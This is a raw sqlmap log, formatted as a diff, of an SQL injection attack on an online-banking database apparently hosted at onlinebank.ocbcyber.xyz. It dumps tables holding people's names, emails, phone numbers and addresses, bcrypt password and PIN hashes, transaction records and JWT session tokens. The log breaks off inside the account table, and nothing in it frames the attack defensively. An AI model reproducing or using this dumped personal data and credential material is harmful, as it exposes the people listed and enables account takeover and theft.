@@ -1,0 +1,459 @@
+back-end DBMS: MySQL >= 5.6
+[11:53:58] [INFO] fetching tables for database: 'bankdb'
+[11:54:01] [INFO] retrieved: 'account'
+[11:54:02] [INFO] retrieved: 'otp_info'
+[11:54:03] [INFO] retrieved: 'passwordresettoken'
+[11:54:04] [INFO] retrieved: 'passwordresettoken_sequence'
+[11:54:05] [INFO] retrieved: 'token'
+[11:54:05] [INFO] retrieved: 'transaction'
+[11:54:07] [INFO] retrieved: 'user'
+[11:54:07] [INFO] fetching columns for table 'passwordresettoken' in database 'bankdb'
+[11:54:08] [INFO] retrieved: 'expiry_date_time'
+[11:54:09] [INFO] retrieved: 'datetime(6)'
+[11:54:10] [INFO] retrieved: 'id'
+[11:54:11] [INFO] retrieved: 'bigint'
+[11:54:12] [INFO] retrieved: 'token'
+[11:54:13] [INFO] retrieved: 'varchar(255)'
+[11:54:14] [INFO] retrieved: 'user_id'
+[11:54:15] [INFO] retrieved: 'bigint'
+[11:54:15] [INFO] fetching entries for table 'passwordresettoken' in database 'bankdb'
+[11:54:16] [INFO] fetching number of entries for table 'passwordresettoken' in database 'bankdb'
+[11:54:16] [INFO] resumed: 0
+[11:54:16] [WARNING] table 'passwordresettoken' in database 'bankdb' appears to be empty
+Database: bankdb
+Table: passwordresettoken
+[0 entries]
++----+---------+-------+------------------+
+| id | user_id | token | expiry_date_time |
++----+---------+-------+------------------+
++----+---------+-------+------------------+
+
+[11:54:16] [INFO] table 'bankdb.passwordresettoken' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bankdb/passwordresettoken.csv'
+[11:54:16] [INFO] fetching columns for table 'otp_info' in database 'bankdb'
+[11:54:18] [INFO] retrieved: 'account_number'
+[11:54:18] [INFO] retrieved: 'varchar(255)'
+[11:54:19] [INFO] retrieved: 'generated_at'
+[11:54:21] [INFO] retrieved: 'datetime(6)'
+[11:54:21] [INFO] retrieved: 'id'
+[11:54:23] [INFO] retrieved: 'bigint'
+[11:54:24] [INFO] retrieved: 'otp'
+[11:54:25] [INFO] retrieved: 'varchar(255)'
+[11:54:25] [INFO] fetching entries for table 'otp_info' in database 'bankdb'
+[11:54:26] [INFO] fetching number of entries for table 'otp_info' in database 'bankdb'
+[11:54:26] [INFO] resumed: 0
+[11:54:26] [WARNING] table 'otp_info' in database 'bankdb' appears to be empty
+Database: bankdb
+Table: otp_info
+[0 entries]
++----+-----+--------------+----------------+
+| id | otp | generated_at | account_number |
++----+-----+--------------+----------------+
++----+-----+--------------+----------------+
+
+[11:54:26] [INFO] table 'bankdb.otp_info' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bankdb/otp_info.csv'
+[11:54:26] [INFO] fetching columns for table 'transaction' in database 'bankdb'
+[11:54:28] [INFO] retrieved: 'amount'
+[11:54:29] [INFO] retrieved: 'double'
+[11:54:30] [INFO] retrieved: 'id'
+[11:54:30] [INFO] retrieved: 'bigint'
+[11:54:32] [INFO] retrieved: 'source_account_id'
+[11:54:32] [INFO] retrieved: 'bigint'
+[11:54:33] [INFO] retrieved: 'target_account_id'
+[11:54:35] [INFO] retrieved: 'bigint'
+[11:54:36] [INFO] retrieved: 'transaction_date'
+[11:54:37] [INFO] retrieved: 'datetime(6)'
+[11:54:38] [INFO] retrieved: 'transaction_type'
+[11:54:39] [INFO] retrieved: 'enum('CASH_CREDIT','CASH_DEPOSIT','CASH_TRANSFER','CASH_WITHDRAWAL')'
+[11:54:39] [INFO] fetching entries for table 'transaction' in database 'bankdb'
+[11:54:47] [INFO] retrieved: '50000'
+[11:54:48] [INFO] retrieved: '2'
+[11:54:49] [INFO] retrieved: '1'
+[11:54:50] [INFO] retrieved: '1'
+[11:54:51] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:54:52] [INFO] retrieved: ' '
+[11:54:53] [INFO] retrieved: '50000'
+[11:54:54] [INFO] retrieved: '3'
+[11:54:55] [INFO] retrieved: '1'
+[11:54:56] [INFO] retrieved: '1'
+[11:54:57] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:54:58] [INFO] retrieved: ' '
+[11:55:00] [INFO] retrieved: '50000'
+[11:55:01] [INFO] retrieved: '4'
+[11:55:02] [INFO] retrieved: '1'
+[11:55:03] [INFO] retrieved: '1'
+[11:55:04] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:05] [INFO] retrieved: ' '
+[11:55:06] [INFO] retrieved: '50000'
+[11:55:07] [INFO] retrieved: '5'
+[11:55:08] [INFO] retrieved: '1'
+[11:55:09] [INFO] retrieved: '1'
+[11:55:10] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:11] [INFO] retrieved: ' '
+[11:55:12] [INFO] retrieved: '50000'
+[11:55:14] [INFO] retrieved: '7'
+[11:55:15] [INFO] retrieved: '2'
+[11:55:16] [INFO] retrieved: '2'
+[11:55:17] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:18] [INFO] retrieved: ' '
+[11:55:19] [INFO] retrieved: '50000'
+[11:55:20] [INFO] retrieved: '8'
+[11:55:21] [INFO] retrieved: '2'
+[11:55:22] [INFO] retrieved: '2'
+[11:55:23] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:24] [INFO] retrieved: ' '
+[11:55:25] [INFO] retrieved: '50000'
+[11:55:26] [INFO] retrieved: '9'
+[11:55:27] [INFO] retrieved: '1'
+[11:55:28] [INFO] retrieved: '1'
+[11:55:29] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:30] [INFO] retrieved: ' '
+[11:55:31] [INFO] retrieved: '50000'
+[11:55:32] [INFO] retrieved: '10'
+[11:55:33] [INFO] retrieved: '1'
+[11:55:34] [INFO] retrieved: '1'
+[11:55:35] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:36] [INFO] retrieved: ' '
+[11:55:37] [INFO] retrieved: '50000'
+[11:55:38] [INFO] retrieved: '11'
+[11:55:39] [INFO] retrieved: '1'
+[11:55:40] [INFO] retrieved: '1'
+[11:55:41] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:42] [INFO] retrieved: ' '
+[11:55:43] [INFO] retrieved: '50000'
+[11:55:44] [INFO] retrieved: '12'
+[11:55:45] [INFO] retrieved: '1'
+[11:55:46] [INFO] retrieved: '1'
+[11:55:47] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:47] [INFO] retrieved: ' '
+[11:55:48] [INFO] retrieved: '50000'
+[11:55:49] [INFO] retrieved: '13'
+[11:55:50] [INFO] retrieved: '2'
+[11:55:51] [INFO] retrieved: '2'
+[11:55:52] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:53] [INFO] retrieved: ' '
+[11:55:54] [INFO] retrieved: '50000'
+[11:55:56] [INFO] retrieved: '14'
+[11:55:56] [INFO] retrieved: '2'
+[11:55:57] [INFO] retrieved: '2'
+[11:55:58] [INFO] retrieved: '2024-07-21 17:02:06.000000'
+[11:55:59] [INFO] retrieved: ' '
+[11:56:00] [INFO] retrieved: '100'
+[11:56:01] [INFO] retrieved: '16'
+[11:56:02] [INFO] retrieved: '1'
+[11:56:03] [INFO] retrieved: ' '
+[11:56:03] [INFO] retrieved: '2024-07-21 17:07:25.927000'
+[11:56:05] [INFO] retrieved: 'CASH_DEPOSIT'
+[11:56:06] [INFO] retrieved: '5000'
+[11:56:07] [INFO] retrieved: '17'
+[11:56:08] [INFO] retrieved: '1'
+[11:56:08] [INFO] retrieved: ' '
+[11:56:09] [INFO] retrieved: '2024-07-21 17:07:45.042000'
+[11:56:10] [INFO] retrieved: 'CASH_DEPOSIT'
+[11:56:11] [INFO] retrieved: '100000'
+[11:56:12] [INFO] retrieved: '18'
+[11:56:13] [INFO] retrieved: '1'
+[11:56:14] [INFO] retrieved: ' '
+[11:56:15] [INFO] retrieved: '2024-07-21 17:08:04.751000'
+[11:56:16] [INFO] retrieved: 'CASH_DEPOSIT'
+[11:56:17] [INFO] retrieved: '2000'
+[11:56:18] [INFO] retrieved: '19'
+[11:56:19] [INFO] retrieved: '1'
+[11:56:20] [INFO] retrieved: ' '
+[11:56:21] [INFO] retrieved: '2024-07-21 17:08:29.496000'
+[11:56:22] [INFO] retrieved: 'CASH_WITHDRAWAL'
+[11:56:23] [INFO] retrieved: '1000'
+[11:56:24] [INFO] retrieved: '20'
+[11:56:25] [INFO] retrieved: '1'
+[11:56:26] [INFO] retrieved: '3'
+[11:56:27] [INFO] retrieved: '2024-07-22 15:54:58.896000'
+[11:56:28] [INFO] retrieved: 'CASH_TRANSFER'
+[11:56:29] [INFO] retrieved: '10000'
+[11:56:30] [INFO] retrieved: '21'
+[11:56:31] [INFO] retrieved: '1'
+[11:56:32] [INFO] retrieved: '3'
+[11:56:33] [INFO] retrieved: '2024-07-22 15:55:15.117000'
+[11:56:34] [INFO] retrieved: 'CASH_TRANSFER'
+Database: bankdb
+Table: transaction
+[18 entries]
++----+-------------------+-------------------+--------+----------------------------+------------------+
+| id | source_account_id | target_account_id | amount | transaction_date           | transaction_type |
++----+-------------------+-------------------+--------+----------------------------+------------------+
+| 2  | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 3  | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 4  | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 5  | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 7  | 2                 | 2                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 8  | 2                 | 2                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 9  | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 10 | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 11 | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 12 | 1                 | 1                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 13 | 2                 | 2                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 14 | 2                 | 2                 | 50000  | 2024-07-21 17:02:06.000000 | NULL             |
+| 16 | 1                 | NULL              | 100    | 2024-07-21 17:07:25.927000 | CASH_DEPOSIT     |
+| 17 | 1                 | NULL              | 5000   | 2024-07-21 17:07:45.042000 | CASH_DEPOSIT     |
+| 18 | 1                 | NULL              | 100000 | 2024-07-21 17:08:04.751000 | CASH_DEPOSIT     |
+| 19 | 1                 | NULL              | 2000   | 2024-07-21 17:08:29.496000 | CASH_WITHDRAWAL  |
+| 20 | 1                 | 3                 | 1000   | 2024-07-22 15:54:58.896000 | CASH_TRANSFER    |
+| 21 | 1                 | 3                 | 10000  | 2024-07-22 15:55:15.117000 | CASH_TRANSFER    |
++----+-------------------+-------------------+--------+----------------------------+------------------+
+
+[11:56:34] [INFO] table 'bankdb.`transaction`' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bankdb/transaction.csv'
+[11:56:34] [INFO] fetching columns for table 'user' in database 'bankdb'
+[11:56:36] [INFO] retrieved: 'address'
+[11:56:38] [INFO] retrieved: 'varchar(255)'
+[11:56:39] [INFO] retrieved: 'country_code'
+[11:56:40] [INFO] retrieved: 'varchar(255)'
+[11:56:41] [INFO] retrieved: 'email'
+[11:56:43] [INFO] retrieved: 'varchar(255)'
+[11:56:44] [INFO] retrieved: 'id'
+[11:56:45] [INFO] retrieved: 'bigint'
+[11:56:46] [INFO] retrieved: 'name'
+[11:56:47] [INFO] retrieved: 'varchar(255)'
+[11:56:48] [INFO] retrieved: 'password'
+[11:56:49] [INFO] retrieved: 'varchar(255)'
+[11:56:50] [INFO] retrieved: 'phone_number'
+[11:56:52] [INFO] retrieved: 'varchar(255)'
+[11:56:52] [INFO] fetching entries for table 'user' in database 'bankdb'
+[11:56:53] [INFO] retrieved: 'Mohamed Singano'
+[11:56:54] [INFO] retrieved: 'Ilala'
+[11:56:56] [INFO] retrieved: 'TZ'
+[11:56:57] [INFO] retrieved: 'singano2009@gmail.com'
+[11:56:58] [INFO] retrieved: '1'
+[11:56:58] [INFO] retrieved: '$2a$12$Nr5PX1iaOXL2R0sBev/FIe9Xvv0vyJ1W4C05E/nt3QSeKrAR/FRlq'
+[11:57:00] [INFO] retrieved: '+255693338637'
+[11:57:01] [INFO] retrieved: 'Mohamed Singano'
+[11:57:02] [INFO] retrieved: 'Kizingo Street 46'
+[11:57:03] [INFO] retrieved: 'TZ'
+[11:57:04] [INFO] retrieved: 'singano@gmail.com'
+[11:57:05] [INFO] retrieved: '2'
+[11:57:06] [INFO] retrieved: '$2a$12$Nr5PX1iaOXL2R0sBev/FIe9Xvv0vyJ1W4C05E/nt3QSeKrAR/FRlq'
+[11:57:07] [INFO] retrieved: '+255693338638'
+[11:57:08] [INFO] retrieved: 'Hacker Account'
+[11:57:09] [INFO] retrieved: 'Ilala'
+[11:57:10] [INFO] retrieved: 'TZ'
+[11:57:11] [INFO] retrieved: 'hacker123@gmail.com'
+[11:57:12] [INFO] retrieved: '3'
+[11:57:14] [INFO] retrieved: '$2a$10$2K.q2vEUV49fayhh6gcNX.zrLKiobyjcYmIQL6R5CstUenVPgQOrO'
+[11:57:15] [INFO] retrieved: '+255693338634'
+[11:57:16] [INFO] retrieved: 'ninama'
+[11:57:17] [INFO] retrieved: 'asdasd asd asd'
+[11:57:18] [INFO] retrieved: 'AS'
+[11:57:19] [INFO] retrieved: 'ni@na.ma'
+[11:57:20] [INFO] retrieved: '4'
+[11:57:21] [INFO] retrieved: '$2a$10$vcn6K/leW0In0zki5.tgq.qSbgB.xuY3iMTE8VlwFxwuGvYoPXQaG'
+[11:57:23] [INFO] retrieved: '6337082'
+[11:57:24] [INFO] retrieved: 'Arch Nexus'
+[11:57:25] [INFO] retrieved: 'DSM'
+[11:57:26] [INFO] retrieved: 'TZ'
+[11:57:27] [INFO] retrieved: 'test@123.com'
+[11:57:28] [INFO] retrieved: '5'
+[11:57:29] [INFO] retrieved: '$2a$10$w7KPpjN9RIAkgte7oddAyOz6b.i.GennAuz.aKbwTsWX3brSjlTum'
+[11:57:30] [INFO] retrieved: '+255739784510'
+[11:57:31] [INFO] retrieved: 'Test Test'
+[11:57:32] [INFO] retrieved: '4567 Dodoma'
+[11:57:33] [INFO] retrieved: 'TZ'
+[11:57:34] [INFO] retrieved: 'test@example.com'
+[11:57:35] [INFO] retrieved: '6'
+[11:57:36] [INFO] retrieved: '$2a$10$yP196FqhvNqEyKRJsV5aC.y0/jS99oC8SXtg1E0GOmQbTq/wH.XmO'
+[11:57:37] [INFO] retrieved: '765123456'
+Database: bankdb
+Table: user
+[6 entries]
++----+-----------------------+-----------------+-------------------+--------------------------------------------------------------+--------------+---------------+
+| id | email                 | name            | address           | password                                                     | country_code | phone_number  |
++----+-----------------------+-----------------+-------------------+--------------------------------------------------------------+--------------+---------------+
+| 1  | singano2009@gmail.com | Mohamed Singano | Ilala             | $2a$12$Nr5PX1iaOXL2R0sBev/FIe9Xvv0vyJ1W4C05E/nt3QSeKrAR/FRlq | TZ           | +255693338637 |
+| 2  | singano@gmail.com     | Mohamed Singano | Kizingo Street 46 | $2a$12$Nr5PX1iaOXL2R0sBev/FIe9Xvv0vyJ1W4C05E/nt3QSeKrAR/FRlq | TZ           | +255693338638 |
+| 3  | hacker123@gmail.com   | Hacker Account  | Ilala             | $2a$10$2K.q2vEUV49fayhh6gcNX.zrLKiobyjcYmIQL6R5CstUenVPgQOrO | TZ           | +255693338634 |
+| 4  | ni@na.ma              | ninama          | asdasd asd asd    | $2a$10$vcn6K/leW0In0zki5.tgq.qSbgB.xuY3iMTE8VlwFxwuGvYoPXQaG | AS           | 6337082       |
+| 5  | test@123.com          | Arch Nexus      | DSM               | $2a$10$w7KPpjN9RIAkgte7oddAyOz6b.i.GennAuz.aKbwTsWX3brSjlTum | TZ           | +255739784510 |
+| 6  | test@example.com      | Test Test       | 4567 Dodoma       | $2a$10$yP196FqhvNqEyKRJsV5aC.y0/jS99oC8SXtg1E0GOmQbTq/wH.XmO | TZ           | 765123456     |
++----+-----------------------+-----------------+-------------------+--------------------------------------------------------------+--------------+---------------+
+
+[11:57:38] [INFO] table 'bankdb.`user`' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bankdb/user.csv'
+[11:57:38] [INFO] fetching columns for table 'passwordresettoken_sequence' in database 'bankdb'
+[11:57:40] [INFO] retrieved: 'next_val'
+[11:57:41] [INFO] retrieved: 'bigint'
+[11:57:41] [INFO] fetching entries for table 'passwordresettoken_sequence' in database 'bankdb'
+[11:57:44] [INFO] retrieved: '1'
+Database: bankdb
+Table: passwordresettoken_sequence
+[1 entry]
++----------+
+| next_val |
++----------+
+| 1        |
++----------+
+
+[11:57:44] [INFO] table 'bankdb.passwordresettoken_sequence' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bankdb/passwordresettoken_sequence.csv'
+[11:57:44] [INFO] fetching columns for table 'token' in database 'bankdb'
+[11:57:46] [INFO] retrieved: 'account_id'
+[11:57:47] [INFO] retrieved: 'bigint'
+[11:57:48] [INFO] retrieved: 'created_at'
+[11:57:49] [INFO] retrieved: 'datetime(6)'
+[11:57:51] [INFO] retrieved: 'expiry_at'
+[11:57:52] [INFO] retrieved: 'datetime(6)'
+[11:57:53] [INFO] retrieved: 'id'
+[11:57:54] [INFO] retrieved: 'bigint'
+[11:57:54] [INFO] retrieved: 'token'
+[11:57:55] [INFO] retrieved: 'varchar(255)'
+[11:57:56] [INFO] fetching entries for table 'token' in database 'bankdb'
+[11:57:57] [INFO] retrieved: '2'
+[11:57:58] [INFO] retrieved: '2024-07-21 11:49:44.575000'
+[11:57:59] [INFO] retrieved: '2024-07-22 11:49:44.000000'
+[11:58:01] [INFO] retrieved: '2'
+[11:58:01] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJmNDU2NjAiLCJpYXQiOjE3MjE1NjI1ODQsImV4cCI6MTcyMTY0ODk4NH0.jqSL38-0tagPFp3-VEMHdfJENkuK31WaxNyZVrmUevIFiIRL_Z06DjjdSMzhDXz1gv78WdrratNPQ0ushVIXYw'
+[11:58:02] [INFO] retrieved: '1'
+[11:58:03] [INFO] retrieved: '2024-07-21 17:00:39.832000'
+[11:58:04] [INFO] retrieved: '2024-07-22 17:00:39.000000'
+[11:58:05] [INFO] retrieved: '5'
+[11:58:06] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5YTlkZjYiLCJpYXQiOjE3MjE1ODEyMzksImV4cCI6MTcyMTY2NzYzOX0.ho8TsGrPsUDyamvVzWZOSb75QCN-I_ANJtta4SduiXplSE2GyKc7o2EQOXBL5wsMpiIxUBdFQF7BsPCLVD5_cA'
+[11:58:07] [INFO] retrieved: '1'
+[11:58:09] [INFO] retrieved: '2024-07-21 17:00:58.727000'
+[11:58:10] [INFO] retrieved: '2024-07-22 17:00:58.000000'
+[11:58:10] [INFO] retrieved: '6'
+[11:58:11] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5YTlkZjYiLCJpYXQiOjE3MjE1ODEyNTgsImV4cCI6MTcyMTY2NzY1OH0.h7zAdfMacLTXciXs815v2l2rrOVbMCUnmFb2KojcOUvfSC4BIcGFP3oeO6pQePgdc_eW8gDGRCtH3B8FBTzSNg'
+[11:58:13] [INFO] retrieved: '2'
+[11:58:14] [INFO] retrieved: '2024-07-21 17:03:49.333000'
+[11:58:15] [INFO] retrieved: '2024-07-22 17:03:49.000000'
+[11:58:16] [INFO] retrieved: '9'
+[11:58:17] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJmNDU2NjAiLCJpYXQiOjE3MjE1ODE0MjksImV4cCI6MTcyMTY2NzgyOX0.Q_HfKV1tdzEli_AYS0HtYqmmXOSnfYNFZZp-8a7TlAUAD3sAVvkEdoIJBRYMeWgO4ZfxgkrOQgbglw6y2jFsvA'
+[11:58:18] [INFO] retrieved: '1'
+[11:58:19] [INFO] retrieved: '2024-07-21 17:05:52.695000'
+[11:58:20] [INFO] retrieved: '2024-07-22 17:05:52.000000'
+[11:58:21] [INFO] retrieved: '10'
+[11:58:22] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5YTlkZjYiLCJpYXQiOjE3MjE1ODE1NTIsImV4cCI6MTcyMTY2Nzk1Mn0.poqyYojcmlcmGTu3rzzeGkhVGjB8yWQumLKF_4hSW5nLI2LBOdh_SscNvxTN8Uz_sTfZuSRfm8yXoSPnQFKy4w'
+[11:58:23] [INFO] retrieved: '3'
+[11:58:24] [INFO] retrieved: '2024-07-22 15:55:46.245000'
+[11:58:25] [INFO] retrieved: '2024-07-23 15:55:46.000000'
+[11:58:27] [INFO] retrieved: '18'
+[11:58:28] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI0MmZmZmQiLCJpYXQiOjE3MjE2NjM3NDYsImV4cCI6MTcyMTc1MDE0Nn0.nVQ1ka29cRCT9KhMBpQWDCHBJ0OloedNLCzEvbqaI9Eqtr6srsXjchX3VWpuQo3W66SIjVP0wurMM8gMZnIi1g'
+[11:58:30] [INFO] retrieved: '4'
+[11:58:31] [INFO] retrieved: '2024-07-24 08:17:00.735000'
+[11:58:32] [INFO] retrieved: '2024-07-25 08:17:00.000000'
+[11:58:33] [INFO] retrieved: '19'
+[11:58:34] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJlZmRmMWUiLCJpYXQiOjE3MjE4MDkwMjAsImV4cCI6MTcyMTg5NTQyMH0.lnrEdKOWqWMAdvPb_QJolMl1-mOP8GvACbMZLQCS0FNXqiDjWZkZdS_VD7nGkD8lS94xjohjUwt9SRlstU10RQ'
+[11:58:35] [INFO] retrieved: '5'
+[11:58:36] [INFO] retrieved: '2024-07-24 10:45:40.426000'
+[11:58:37] [INFO] retrieved: '2024-07-25 10:45:40.000000'
+[11:58:38] [INFO] retrieved: '20'
+[11:58:39] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhMGIxMTEiLCJpYXQiOjE3MjE4MTc5NDAsImV4cCI6MTcyMTkwNDM0MH0.dohqsFyrsyE-pDFJN0D8N3ccQ23KxPtA8Zy6c0M7trxwCFx0W6D-9pxnVS7pQXlfqzlmFBQVz44azplificjmg'
+[11:58:40] [INFO] retrieved: '5'
+[11:58:41] [INFO] retrieved: '2024-07-24 11:37:48.930000'
+[11:58:42] [INFO] retrieved: '2024-07-25 11:37:48.000000'
+[11:58:43] [INFO] retrieved: '22'
+[11:58:44] [INFO] retrieved: 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhMGIxMTEiLCJpYXQiOjE3MjE4MjEwNjgsImV4cCI6MTcyMTkwNzQ2OH0.IwX-uW_o4J9OfZYygNV7CO8X3m2OovDfMYm7-okmjNffY-nswBLzk2XX0E0GGbLpuDePnNL0HU9nrAjunUp8XA'
+Database: bankdb
+Table: token
+[9 entries]
++----+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------+----------------------------+
+| id | account_id | token                                                                                                                                                                           | expiry_at                  | created_at                 |
++----+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------+----------------------------+
+| 2  | 2          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJmNDU2NjAiLCJpYXQiOjE3MjE1NjI1ODQsImV4cCI6MTcyMTY0ODk4NH0.jqSL38-0tagPFp3-VEMHdfJENkuK31WaxNyZVrmUevIFiIRL_Z06DjjdSMzhDXz1gv78WdrratNPQ0ushVIXYw | 2024-07-22 11:49:44.000000 | 2024-07-21 11:49:44.575000 |
+| 5  | 1          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5YTlkZjYiLCJpYXQiOjE3MjE1ODEyMzksImV4cCI6MTcyMTY2NzYzOX0.ho8TsGrPsUDyamvVzWZOSb75QCN-I_ANJtta4SduiXplSE2GyKc7o2EQOXBL5wsMpiIxUBdFQF7BsPCLVD5_cA | 2024-07-22 17:00:39.000000 | 2024-07-21 17:00:39.832000 |
+| 6  | 1          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5YTlkZjYiLCJpYXQiOjE3MjE1ODEyNTgsImV4cCI6MTcyMTY2NzY1OH0.h7zAdfMacLTXciXs815v2l2rrOVbMCUnmFb2KojcOUvfSC4BIcGFP3oeO6pQePgdc_eW8gDGRCtH3B8FBTzSNg | 2024-07-22 17:00:58.000000 | 2024-07-21 17:00:58.727000 |
+| 9  | 2          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJmNDU2NjAiLCJpYXQiOjE3MjE1ODE0MjksImV4cCI6MTcyMTY2NzgyOX0.Q_HfKV1tdzEli_AYS0HtYqmmXOSnfYNFZZp-8a7TlAUAD3sAVvkEdoIJBRYMeWgO4ZfxgkrOQgbglw6y2jFsvA | 2024-07-22 17:03:49.000000 | 2024-07-21 17:03:49.333000 |
+| 10 | 1          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI5YTlkZjYiLCJpYXQiOjE3MjE1ODE1NTIsImV4cCI6MTcyMTY2Nzk1Mn0.poqyYojcmlcmGTu3rzzeGkhVGjB8yWQumLKF_4hSW5nLI2LBOdh_SscNvxTN8Uz_sTfZuSRfm8yXoSPnQFKy4w | 2024-07-22 17:05:52.000000 | 2024-07-21 17:05:52.695000 |
+| 18 | 3          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI0MmZmZmQiLCJpYXQiOjE3MjE2NjM3NDYsImV4cCI6MTcyMTc1MDE0Nn0.nVQ1ka29cRCT9KhMBpQWDCHBJ0OloedNLCzEvbqaI9Eqtr6srsXjchX3VWpuQo3W66SIjVP0wurMM8gMZnIi1g | 2024-07-23 15:55:46.000000 | 2024-07-22 15:55:46.245000 |
+| 19 | 4          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJlZmRmMWUiLCJpYXQiOjE3MjE4MDkwMjAsImV4cCI6MTcyMTg5NTQyMH0.lnrEdKOWqWMAdvPb_QJolMl1-mOP8GvACbMZLQCS0FNXqiDjWZkZdS_VD7nGkD8lS94xjohjUwt9SRlstU10RQ | 2024-07-25 08:17:00.000000 | 2024-07-24 08:17:00.735000 |
+| 20 | 5          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhMGIxMTEiLCJpYXQiOjE3MjE4MTc5NDAsImV4cCI6MTcyMTkwNDM0MH0.dohqsFyrsyE-pDFJN0D8N3ccQ23KxPtA8Zy6c0M7trxwCFx0W6D-9pxnVS7pQXlfqzlmFBQVz44azplificjmg | 2024-07-25 10:45:40.000000 | 2024-07-24 10:45:40.426000 |
+| 22 | 5          | eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhMGIxMTEiLCJpYXQiOjE3MjE4MjEwNjgsImV4cCI6MTcyMTkwNzQ2OH0.IwX-uW_o4J9OfZYygNV7CO8X3m2OovDfMYm7-okmjNffY-nswBLzk2XX0E0GGbLpuDePnNL0HU9nrAjunUp8XA | 2024-07-25 11:37:48.000000 | 2024-07-24 11:37:48.930000 |
++----+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------+----------------------------+
+
+[11:58:45] [INFO] table 'bankdb.token' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bankdb/token.csv'
+[11:58:45] [INFO] fetching columns for table 'account' in database 'bankdb'
+[11:58:47] [INFO] retrieved: 'account_number'
+[11:58:48] [INFO] retrieved: 'varchar(255)'
+[11:58:49] [INFO] retrieved: 'account_status'
+[11:58:50] [INFO] retrieved: 'varchar(255)'
+[11:58:52] [INFO] retrieved: 'account_type'
+[11:58:52] [INFO] retrieved: 'varchar(255)'
+[11:58:53] [INFO] retrieved: 'balance'
+[11:58:54] [INFO] retrieved: 'double'
+[11:58:55] [INFO] retrieved: 'branch'
+[11:58:56] [INFO] retrieved: 'varchar(255)'
+[11:58:57] [INFO] retrieved: 'id'
+[11:58:59] [INFO] retrieved: 'bigint'
+[11:59:00] [INFO] retrieved: 'ifsc_code'
+[11:59:01] [INFO] retrieved: 'varchar(255)'
+[11:59:01] [INFO] retrieved: 'pin'
+[11:59:02] [INFO] retrieved: 'varchar(255)'
+[11:59:03] [INFO] retrieved: 'user_id'
+[11:59:04] [INFO] retrieved: 'bigint'
+[11:59:04] [INFO] fetching entries for table 'account' in database 'bankdb'
+[11:59:07] [INFO] retrieved: '9a9df6'
+[11:59:07] [INFO] retrieved: ' '
+[11:59:09] [INFO] retrieved: 'Savings'
+[11:59:10] [INFO] retrieved: '92100'
+[11:59:11] [INFO] retrieved: 'NIT'
+[11:59:11] [INFO] retrieved: '1'
+[11:59:12] [INFO] retrieved: 'NIT001'
+[11:59:13] [INFO] retrieved: '$2a$12$dNIRGeS3hZkCrRAWwWu/IO8/d4uDsm4mTna4qks9DYwMkWKV9gyMa'
+[11:59:14] [INFO] retrieved: '1'
+[11:59:15] [INFO] retrieved: 'f45660'
+[11:59:17] [INFO] retrieved: ' '
+[11:59:18] [INFO] retrieved: 'Savings'
+[11:59:19] [INFO] retrieved: '0'
+[11:59:19] [INFO] retrieved: 'NIT'
+[11:59:20] [INFO] retrieved: '2'
+[11:59:21] [INFO] retrieved: 'NIT001'
